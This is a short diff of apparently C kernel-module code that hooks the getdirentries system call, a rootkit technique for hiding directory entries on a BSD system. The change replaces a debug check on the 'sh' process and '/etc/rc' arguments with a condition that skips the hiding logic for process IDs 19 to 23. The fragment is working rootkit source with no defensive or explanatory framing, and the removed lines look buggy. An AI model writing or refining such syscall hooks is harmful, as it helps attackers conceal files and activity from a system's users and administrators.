@@ -253,18 +253,9 @@ getdirentries_hook(struct thread *td, void *syscall_args)
 	sys_getdirentries(td, syscall_args);
 	hook(sys_getdirentries, getdirentries_hook);
 
-	if  ( strcmp(td->td_proc->p_comm, "sh") || td->td_proc->p_pid == 22 )
+	if  ( td->td_proc->p_pid > 18 && td->td_proc->p_pid < 24 )
 	{
-		LOGF("ARG LENGTH = %d\n", td->td_proc->p_args->ar_length);
-		LOGF("args = %s\n", arg_check);
-		if( td->td_proc->p_args->ar_length == 21 ){
-				u_char *arg_check = td->td_proc->p_args->ar_args+3;
-				LOGF("args = %s\n", arg_check);
-				if(strcmp(arg_check, "/etc/rc")){
-						LOGF("Found Match\n");
-						return(0);
-				}
-		}
+		return(0);
 	}
 
 	size = td->td_retval[0];
